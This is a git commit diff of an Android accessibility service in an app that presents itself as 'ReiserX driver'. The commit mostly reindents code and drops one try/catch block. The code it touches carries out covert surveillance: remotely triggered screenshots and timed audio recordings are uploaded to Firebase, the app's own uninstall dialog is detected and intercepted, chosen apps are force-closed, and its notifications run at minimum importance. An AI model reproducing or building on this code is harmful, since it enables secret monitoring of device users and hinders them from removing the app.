c80a8bf0900b1e780f90545c39ccbb6e8d93e387
zeeshan <skzeeshan3650@gmail.com>
2024-01-02 18:49:21 +0530

    Version 4.4 - commit 1

--- app/src/main/java/com/reiserx/testtrace/Screenshot/accessibilityService.java
+++ app/src/main/java/com/reiserx/testtrace/Screenshot/accessibilityService.java
@@ -60,93 +60,88 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        try {
-            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
-            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
-            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
-            info.flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
-            info.notificationTimeout = 100;
-            setServiceInfo(info);
-            instance = this;
-            updateAccessibility();
-            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
+        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
+        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
+        info.flags = AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
+        info.notificationTimeout = 100;
+        setServiceInfo(info);
+        instance = this;
+        updateAccessibility();
+        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
 
-            sendNotification(this, "ReiserX driver", "Accessibility service is running", 10);
-        } catch (Exception e) {
-            ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
-            exceptionHandler.upload();
-        }
+        sendNotification(this, "ReiserX driver", "Accessibility service is running", 10);
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
-        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.reiserx.testtrace")) {
+            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.reiserx.testtrace")) {
 
-            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-                Log.d(TAG, "Recieved event");
-                Parcelable data = accessibilityEvent.getParcelableData();
-                if (data instanceof Notification) {
-                    Log.d(TAG, "Recieved notification");
-                    Notification notification = (Notification) data;
+                if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
+                    Log.d(TAG, "Recieved event");
+                    Parcelable data = accessibilityEvent.getParcelableData();
+                    if (data instanceof Notification) {
+                        Log.d(TAG, "Recieved notification");
+                        Notification notification = (Notification) data;
 
-                    if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
+                        if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {
 
-                        String title = notification.extras.getString("android.title");
-                        if (title.contains("com.reiserx.testtrace.accessibility")) {
-                            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
-                            String UserID = save.getString("UserID", "");
+                            String title = notification.extras.getString("android.title");
+                            if (title.contains("com.reiserx.testtrace.accessibility")) {
+                                SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+                                String UserID = save.getString("UserID", "");
 
-                            int message = Integer.parseInt(notification.extras.getString("android.text"));
-                            switch (message) {
-                                case 1:
-                                    takeScreenshots(UserID);
-                                    instance = accessibilityService.this;
-                                    updateAccessibility();
-                                    break;
-                                case 2:
-                                    long value = Long.parseLong(title.replaceAll("[\\D]", ""));
-                                    final Handler handler = new Handler(Looper.getMainLooper());
-                                    startRecording();
-                                    handler.postDelayed(() -> stopRecording(UserID), value);
-                                    instance = accessibilityService.this;
-                                    updateAccessibility();
-                                    break;
-                                case 3:
-                                    instance = accessibilityService.this;
-                                    updateAccessibility();
-                                    break;
+                                int message = Integer.parseInt(notification.extras.getString("android.text"));
+                                switch (message) {
+                                    case 1:
+                                        takeScreenshots(UserID);
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                    case 2:
+                                        long value = Long.parseLong(title.replaceAll("[\\D]", ""));
+                                        final Handler handler = new Handler(Looper.getMainLooper());
+                                        startRecording();
+                                        handler.postDelayed(() -> stopRecording(UserID), value);
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                    case 3:
+                                        instance = accessibilityService.this;
+                                        updateAccessibility();
+                                        break;
+                                }
                             }
                         }
                     }
                 }
             }
-        }
 
 
-        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.android.systemui")) {
-            if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
-                Log.d(TAG, "back");
-                instance = this;
-            } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
-                Log.d(TAG, "home");
-                instance = this;
+            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.android.systemui")) {
+                if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Back")) {
+                    Log.d(TAG, "back");
+                    instance = this;
+                } else if (String.valueOf(accessibilityEvent.getContentDescription()).trim().equals("Home")) {
+                    Log.d(TAG, "home");
+                    instance = this;
+                }
             }
-        }
-        if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.google.android.packageinstaller")) {
-            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                Log.d(TAG, String.valueOf(accessibilityEvent.getPackageName()));
-                name = null;
-                action = null;
-                logNodeHeirarchy(getRootInActiveWindow(), 0);
-                if (name != null && action != null) {
-                    if (name.equals("ReiserX driver") && action.equals("Do you want to uninstall this app?")) {
-                        uninstalls();
+            if (String.valueOf(accessibilityEvent.getPackageName()).equals("com.google.android.packageinstaller")) {
+                if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                    Log.d(TAG, String.valueOf(accessibilityEvent.getPackageName()));
+                    name = null;
+                    action = null;
+                    logNodeHeirarchy(getRootInActiveWindow(), 0);
+                    if (name != null && action != null) {
+                        if (name.equals("ReiserX driver") && action.equals("Do you want to uninstall this app?")) {
+                            uninstalls();
+                        }
                     }
                 }
             }
-        }
 
-        disableApps();
+            disableApps();
     }
 
     public void uninstalls() {
@@ -307,25 +302,25 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     public void updateAudioToServer(String UserID, File filePath) {
         try {
-            FirebaseStorage storage = FirebaseStorage.getInstance();
-            FirebaseFirestore firestore = FirebaseFirestore.getInstance();
+        FirebaseStorage storage = FirebaseStorage.getInstance();
+        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
 
-            String filename = getRandom.getRandom(0, 1000000000) + ".mp3";
+        String filename = getRandom.getRandom(0, 1000000000) + ".mp3";
 
-            DocumentReference collectionReference = firestore.collection("Main").document(UserID).collection("AudioRecordings").document(filename);
-            StorageReference reference = storage.getReference().child("Main").child(UserID).child("AudioRecordings").child(filename);
-            reference.putFile(Uri.fromFile(filePath)).addOnCompleteListener(task -> {
-                Log.d(TAG, "uploading");
-                if (task.isSuccessful()) {
-                    reference.getDownloadUrl().addOnSuccessListener(uri -> {
-                        Log.d(TAG, "getting url");
-                        Calendar cal = Calendar.getInstance();
-                        long currentTime = cal.getTimeInMillis();
-                        AudiosDownloadUrl downloadUrl = new AudiosDownloadUrl(uri.toString(), filename, currentTime);
-                        collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> filePath.delete());
-                    });
-                }
-            });
+        DocumentReference collectionReference = firestore.collection("Main").document(UserID).collection("AudioRecordings").document(filename);
+        StorageReference reference = storage.getReference().child("Main").child(UserID).child("AudioRecordings").child(filename);
+        reference.putFile(Uri.fromFile(filePath)).addOnCompleteListener(task -> {
+            Log.d(TAG, "uploading");
+            if (task.isSuccessful()) {
+                reference.getDownloadUrl().addOnSuccessListener(uri -> {
+                    Log.d(TAG, "getting url");
+                    Calendar cal = Calendar.getInstance();
+                    long currentTime = cal.getTimeInMillis();
+                    AudiosDownloadUrl downloadUrl = new AudiosDownloadUrl(uri.toString(), filename, currentTime);
+                    collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> filePath.delete());
+                });
+            }
+        });
         } catch (Exception e) {
             ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
             exceptionHandler.upload();
@@ -334,10 +329,10 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     private void updateAccessibility() {
         try {
-            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
-            String UserID = save.getString("UserID", "");
-            String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
-            FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("ServiceStatus").child("AccessibilityUpdate").setValue(currentTime);
+        SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+        String UserID = save.getString("UserID", "");
+        String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
+        FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("ServiceStatus").child("AccessibilityUpdate").setValue(currentTime);
         } catch (Exception e) {
             ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
             exceptionHandler.upload();
@@ -347,35 +342,35 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
     public void sendNotification(Context context, String title, String content, int id) {
         try {
 
-            SharedPreferences flag = context.getSharedPreferences("Flags", MODE_PRIVATE);
+        SharedPreferences flag = context.getSharedPreferences("Flags", MODE_PRIVATE);
 
-            if (flag.getBoolean("AccessibilityNotify", false)) {
-                NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
-                String channel_id = "ReiserXAccessibility";
+        if (flag.getBoolean("AccessibilityNotify", false)) {
+            NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+            String channel_id = "ReiserXAccessibility";
 
-                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                    @SuppressLint("WrongConstant")
-                    NotificationChannel notificationChannel = new NotificationChannel(channel_id, "Service", NotificationManager.IMPORTANCE_MIN);
-                    notificationChannel.setDescription("service");
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                @SuppressLint("WrongConstant")
+                NotificationChannel notificationChannel = new NotificationChannel(channel_id, "Service", NotificationManager.IMPORTANCE_MIN);
+                notificationChannel.setDescription("service");
 
-                    notificationManager.createNotificationChannel(notificationChannel);
-                }
-
-                NotificationCompat.Builder notify_bulder = new NotificationCompat.Builder(context, channel_id);
-                notify_bulder
-                        .setDefaults(Notification.DEFAULT_ALL)
-                        .setWhen(System.currentTimeMillis())
-                        .setSmallIcon(R.drawable.ic_baseline_circle_notifications_24)
-                        .setContentText(content)
-                        .setContentTitle(title)
-                        .setPriority(NotificationManager.IMPORTANCE_MIN)
-                        .setContentInfo("info");
-
-                // Gets an instance of the NotificationManager service
-                notificationManager.notify(id, notify_bulder.build());
-                // Notification ID cannot be 0.
-                startForeground(id, notify_bulder.getNotification());
+                notificationManager.createNotificationChannel(notificationChannel);
             }
+
+            NotificationCompat.Builder notify_bulder = new NotificationCompat.Builder(context, channel_id);
+            notify_bulder
+                    .setDefaults(Notification.DEFAULT_ALL)
+                    .setWhen(System.currentTimeMillis())
+                    .setSmallIcon(R.drawable.ic_baseline_circle_notifications_24)
+                    .setContentText(content)
+                    .setContentTitle(title)
+                    .setPriority(NotificationManager.IMPORTANCE_MIN)
+                    .setContentInfo("info");
+
+            // Gets an instance of the NotificationManager service
+            notificationManager.notify(id, notify_bulder.build());
+            // Notification ID cannot be 0.
+            startForeground(id, notify_bulder.getNotification());
+        }
         } catch (Exception e) {
             ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
             exceptionHandler.upload();
@@ -384,12 +379,12 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
 
     void disableApps() {
         try {
-            SharedPreferences save = getSharedPreferences("blocked", MODE_PRIVATE);
-            getCurrentTask getCurrentTask = new getCurrentTask(this);
-            if (save.getString(getCurrentTask.getPackage(), "").equals("1")) {
-                performGlobalAction(GLOBAL_ACTION_BACK);
-                performGlobalAction(GLOBAL_ACTION_HOME);
-            }
+        SharedPreferences save = getSharedPreferences("blocked", MODE_PRIVATE);
+        getCurrentTask getCurrentTask = new getCurrentTask(this);
+        if (save.getString(getCurrentTask.getPackage(), "").equals("1")) {
+            performGlobalAction(GLOBAL_ACTION_BACK);
+            performGlobalAction(GLOBAL_ACTION_HOME);
+        }
         } catch (Exception e) {
             ExceptionHandler exceptionHandler = new ExceptionHandler(e, accessibilityService.this);
             exceptionHandler.upload();
